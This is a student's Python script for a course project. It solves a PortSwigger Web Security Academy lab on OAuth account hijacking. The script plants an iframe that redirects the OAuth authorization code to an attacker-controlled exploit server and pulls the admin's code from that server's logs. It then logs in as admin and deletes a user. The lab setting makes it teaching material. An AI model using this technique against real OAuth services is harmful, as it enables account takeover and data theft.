# Bradley Thompson
# CS595 Winter 2022 Final Project
# https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

import re
import requests

from Helpers import parseArgsForSite, uploadExploit, searchResponse, checkForSiteLiveness

site = parseArgsForSite('https://ac181f591f992049c0442e45005200a0.web-security-academy.net/')
checkForSiteLiveness(site)
s = requests.Session()

if __name__ == "__main__":
    resp = s.get(f'https://{site}/social-login', allow_redirects=False)

    # Find exploit URI
    exploit_uri = searchResponse(resp, 'a', {'id': 'exploit-link'}).get('href')
    print(f'Found exploit server URI: {exploit_uri}')

    # Find social login url in <meta> tag content
    social_login_url = searchResponse(resp, 'meta', {'http-equiv': 'refresh'}).get('content').split('url=')[1]
    oauth_site = social_login_url.split('/')[2]
    print(f'Found social media login url: {social_login_url}')
    print('OAuth host: ', oauth_site)

    # Find client_id in social login URL
    client_id = re.search('client_id=(.+)&redirect', social_login_url).group(1)
    print(f'Found client ID: {client_id}')

    # Note: Observed oauth URL when manually traversing oauth flow.

    # Craft and upload exploit, then check exploit server logs for oauth code to use in sign-in
    exploit_payload = f'<iframe src="https://{oauth_site}/auth?client_id={client_id}&redirect_uri={exploit_uri}' \
                      + f'&response_type=code&scope=openid%20profile%20email"></iframe>'
    print(f'Created exploit payload with new redirect url: {exploit_payload}')
    resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
    if resp.status_code == 200:
        print('Uploaded exploit to server...')
    else:
        print('Failed to upload exploit.')
        exit()

    # Since we delivered the exploit, the admin will automatically access the page w/ our corrupted redirect_uri
    # So, our exploit server logs should show a request including the admin's code.
    resp = s.get(f'{exploit_uri}/log')
    code = re.findall('code=(.+) HTTP', resp.text).pop()
    # Doing this multiple times gets many codes in logs, so find all and grab the last (most recent) one.
    print(f'Found admin OAuth code!\nCode: {code}')

    # Use oauth-callback link that is normally redirected to w/ a user's validated OAuth code, using admin's code.
    # Successfully logs us in as admin, then we can just nav to admin panel and delete carlos
    resp = s.get(f'https://{site}/oauth-callback?code={code}')
    admin_uid = re.search('/my-account\\?id=(.+)"', resp.text).group(1)
    print(f'Logged in as {admin_uid}; deleting carlos...')
    resp = s.post(f'https://{site}/admin/delete?username=carlos')
    if resp.status_code == 200:
        print("he gone")
